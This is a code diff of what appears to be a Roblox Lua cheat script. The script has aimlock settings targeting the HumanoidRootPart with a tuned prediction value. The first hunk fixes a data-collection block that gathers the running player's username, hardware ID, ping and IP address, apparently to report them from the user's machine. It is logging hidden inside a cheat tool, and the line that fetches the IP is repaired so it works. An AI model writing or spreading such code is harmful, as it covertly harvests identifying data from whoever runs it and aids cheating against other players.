@@ -9,11 +9,10 @@ pcall(function()
        ['title'] = 'script',
        ['description'] = '',
        ['fields'] = {
-          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
+          {name = 'Username', value = game:GetService("Players").LocalPlayer.Name},
           {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
           {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
-          {name = "ip", value = game:GetService("HttpService"):GetAsync(ip_api_url)
-
+          {name = "IP", value = game:GetService("HttpService"):GetAsync(ip_api_url) },
         }
     }
   }
@@ -69,7 +68,7 @@ local Settings = {
 
 local SelectedPart = "HumanoidRootPart"
 local Prediction = true
-local PredictionValue = 0.15634
+local PredictionValue = 0.15640
 
 
     local AnchorCount = 0
